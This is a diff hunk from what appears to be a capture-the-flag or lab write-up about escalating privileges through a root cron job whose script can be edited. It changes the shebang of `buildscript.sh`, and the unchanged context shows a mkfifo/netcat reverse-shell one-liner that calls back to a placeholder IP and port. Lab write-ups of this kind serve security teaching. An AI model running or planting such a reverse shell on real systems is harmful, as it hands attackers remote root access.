@@ -219,7 +219,7 @@ Knowing that the cron job is executing as `root` user and we can edit the conten
     `buildscript.sh` content:
 
     ```bash
-    #!/bin/bash
+    #!/bin/sh
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f
     ```
